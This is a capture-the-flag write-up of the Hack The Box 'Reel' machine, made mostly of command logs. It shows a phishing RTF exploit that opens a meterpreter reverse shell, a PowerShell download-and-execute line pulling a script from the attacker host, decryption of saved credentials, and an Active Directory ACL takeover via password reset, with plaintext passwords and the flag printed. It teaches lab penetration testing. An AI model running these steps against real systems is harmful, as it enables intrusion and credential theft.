---
title: "[HTB] Reel"
permalink: /writeups/htb/reel/
excerpt: "Quick write-up for the Reel machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
---

---

{% include toc icon="cog" title="Reel Solution" %}

The [Reel](https://app.hackthebox.com/machines/Reel) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an hard Windows Machine with a strong focus on Active Directory exploitation.
{: .text-justify}

![image-center](/images/htb/htb_reel_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}


```bash
$ nmap -sV -Pn 10.129.155.236
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 11:18 EST
Nmap scan report for 10.129.155.236
Host is up (0.020s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
25/tcp    open  smtp?
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  unknown
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.76 seconds
```

```bash
$ ftp 10.129.155.236
Connected to 10.129.155.236.
220 Microsoft FTP Service
Name (10.129.155.236:ax): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41000|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||41001|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> 
```

```bash
$ cat readme.txt         
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.   
```

AppLocker.docx contain

```text
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

```bash
$ exiftool WindowsEventForwarding.docx 
ExifTool Version Number         : 12.39
File Name                       : WindowsEventForwarding.docx
Directory                       : .
File Size                       : 14 KiB
File Modification Date/Time     : 2017:10:31 17:13:23-04:00
File Access Date/Time           : 2022:02:11 11:31:56-05:00
File Inode Change Date/Time     : 2022:02:11 11:31:44-05:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
```


```bash
msf6 exploit(windows/fileformat/office_word_hta) > show options 

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.doc          yes       The file name.
   SRVHOST   10.10.14.97      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word

msf6 exploit(windows/fileformat/office_word_hta) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.97:4444 
[+] hello.rtf stored at /root/.msf4/local/hello.rtf
```

```bash
$ sudo swaks --to nico@megabank.com --server 10.129.155.236 --attach /root/.msf4/local/hello.rtf
[sudo] password for ax: 
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying 10.129.155.236:25...
=== Connected to 10.129.155.236.
<-  220 Mail Service ready
 -> EHLO nms
<-  250-REEL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> MAIL FROM:<root@nms>
<-  250 OK
 -> RCPT TO:<nico@megabank.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Fri, 11 Feb 2022 13:17:58 -0500
 -> To: nico@megabank.com
 -> From: root@nms
 -> Subject: test Fri, 11 Feb 2022 13:17:58 -0500

...[snip]...

```

```bash
msf6 exploit(windows/fileformat/office_word_hta) > [*] Using URL: http://10.10.14.97:8080/default.hta
[*] Server started.
[*] Sending stage (175174 bytes) to 10.129.155.236
[*] Meterpreter session 1 opened (10.10.14.97:4444 -> 10.129.155.236:49937 ) at 2022-02-11 15:12:55 -0500

msf6 exploit(windows/fileformat/office_word_hta) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer        : REEL
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_GB
Domain          : HTB
Logged On Users : 6
Meterpreter     : x86/windows
meterpreter > getuid
Server username: HTB\nico
meterpreter > 
```

```bash
meterpreter > ls C:\\Users\\nico\\Desktop
Listing: C:\Users\nico\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  1468  fil   2017-10-27 19:59:16 -0400  cred.xml
100666/rw-rw-rw-  282   fil   2017-10-27 18:42:45 -0400  desktop.ini
100444/r--r--r--  32    fil   2017-10-27 19:40:33 -0400  user.txt
100666/rw-rw-rw-  162   fil   2017-10-27 17:34:38 -0400  ~$iledDeliveryNotification.doc

meterpreter > cat C:\\Users\\nico\\Desktop\\cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
meterpreter > 
```

https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx

```bash
meterpreter > load powershell 
Loading extension powershell...Success.         
meterpreter > powershell_shell 
PS > $credential = Import-CliXml -Path c:\users\nico\desktop\cred.xml
PS > $credential.GetNetworkCredential().Password
1ts-mag1c!!!
PS > 
```

```
$ ssh tom@10.129.155.236   
tom@10.129.155.236's password: 


Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.    

tom@REEL C:\Users\tom> 
```

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir                                                                 
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                

05/29/2018  07:57 PM    <DIR>          .                                                                                        
05/29/2018  07:57 PM    <DIR>          ..                                                                                       
11/16/2017  11:50 PM           112,225 acls.csv                                                                                 
10/28/2017  08:50 PM             3,549 BloodHound.bin                                                                           
10/24/2017  03:27 PM           246,489 BloodHound_Old.ps1                                                                       
10/24/2017  03:27 PM           568,832 SharpHound.exe                                                                           
10/24/2017  03:27 PM           636,959 SharpHound.ps1                                                                           
               5 File(s)      1,568,054 bytes                                                                                   
               2 Dir(s)  15,741,628,416 bytes free                                                                              
```

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell        

PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern tom                      

...[snip]...                                 

"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"                                     
```

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern nico                     

...[snip]...  

"herman@HTB.LOCAL","USER","","nico@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"                                    
```

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern claire                   

...[snip]...

"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
```

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Get-Content .\acls.csv | Select-String -Pattern Backup_Admins            

"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows                                                                          
Permissions@HTB.LOCAL","GROUP","ExtendedRight","User-Force-Change-Password","AccessAllowed","False"                             
"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows                                                                          
Permissions@HTB.LOCAL","GROUP","WriteProperty","Member","AccessAllowed","False"                                                 
"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","False"    
"Backup_Admins@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","False"    
"Backup_Admins@HTB.LOCAL","GROUP","","Domain Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"                  
"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
"Backup_Admins@HTB.LOCAL","GROUP","","herman@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                           
"Backup_Admins@HTB.LOCAL","GROUP","","julia@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"                            
"Backup_Admins@HTB.LOCAL","GROUP","","Enterprise Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"              
"Backup_Admins@HTB.LOCAL","GROUP","","Account Operators@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"              
"Backup_Admins@HTB.LOCAL","GROUP","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"       
"Backup_Admins@HTB.LOCAL","GROUP","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"                    
"Backup_Admins@HTB.LOCAL","GROUP","","Domain Admins@HTB.LOCAL","GROUP","Owner","","AccessAllowed","False"                       
```

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> cd .. 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> dir                                                                                


    Directory: C:\Users\tom\Desktop\AD Audit\BloodHound                                                                         


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d----         5/29/2018   8:57 PM            Ingestors                                                                          
-a---        10/30/2017  10:15 PM     769587 PowerView.ps1

```

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $creds = ConvertTo-SecureString 'Qwerty123!' -AsPlainText -Force
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $creds -Verbose           
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'claire'                                              
VERBOSE: [Set-DomainUserPassword] Password for user 'claire' successfully reset   

```

```bash
$ ssh claire@10.129.155.236
claire@10.129.155.236's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                  
The command completed successfully.                                                                                             

claire@REEL C:\Users\claire> net group backup_admins                                                                              
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.                 

```


claire@REEL C:\Users\claire>powershell                                                                                          
Windows PowerShell                                                                                                              
Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\claire> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.97/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended                                                                                                     


+------+------------------------------------------------+------+                                                                
| TEST | CREDS > WinLogon                               | VULN |                                                                
+------+------------------------------------------------+------+                                                                
| DESC | Parse the Winlogon registry keys and check whether    |                                                                
|      | they contain any clear-text password. Entries that    |                                                                
|      | have an empty password field are filtered out.        |                                                                
+------+-------------------------------------------------------+                                                                
[*] Found 1 result(s).                                                                                                          


Domain   : HTB                                                                                                                  
Username : nico                                                                                                                 
Password : 4dri@na2017!**                                                                                                       


PS C:\Users\administrator> net group backup_admins claire /add                                                                  
The command completed successfully.                                                                                             

PS C:\Users\administrator> net group backup_admins                                                                              
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.                 

claire@REEL c:\Users\Administrator\Desktop>type root.txt                                                                        
Access is denied.                                                                                                               

claire@REEL c:\Users\Administrator\Desktop>cd "Backup Scripts"                                                                  

claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of c:\Users\Administrator\Desktop\Backup Scripts                                                                     

11/02/2017  09:47 PM    <DIR>          .                                                                                        
11/02/2017  09:47 PM    <DIR>          ..                                                                                       
11/03/2017  11:22 PM               845 backup.ps1                                                                               
11/02/2017  09:37 PM               462 backup1.ps1                                                                              
11/03/2017  11:21 PM             5,642 BackupScript.ps1                                                                         
11/02/2017  09:43 PM             2,791 BackupScript.zip                                                                         
11/03/2017  11:22 PM             1,855 folders-system-state.txt                                                                 
11/03/2017  11:22 PM               308 test2.ps1.txt                                                                            
               6 File(s)         11,903 bytes                                                                                   
               2 Dir(s)  15,738,982,400 bytes free                                                                              

claire@REEL c:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"                                                                                                    

#Variables, only Change here                                                                                                    
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location            




Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

administrator@REEL C:\Users\Administrator>cd Desktop                                                                            

administrator@REEL C:\Users\Administrator\Desktop>ls                                                                            
'ls' is not recognized as an internal or external command,                                                                      
operable program or batch file.                                                                                                 

administrator@REEL C:\Users\Administrator\Desktop>dir                                                                           
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\Administrator\Desktop                                                                                    

21/01/2018  14:56    <DIR>          .                                                                                           
21/01/2018  14:56    <DIR>          ..                                                                                          
02/11/2017  21:47    <DIR>          Backup Scripts                                                                              
28/10/2017  11:56                32 root.txt                                                                                    
               1 File(s)             32 bytes                                                                                   
               3 Dir(s)  15,738,458,112 bytes free                                                                              

administrator@REEL C:\Users\Administrator\Desktop>type root.txt                                                                 
1018a0331e686176ff4577c728eaf32a                                                                                                
administrator@REEL C:\Users\Administrator\Desktop>     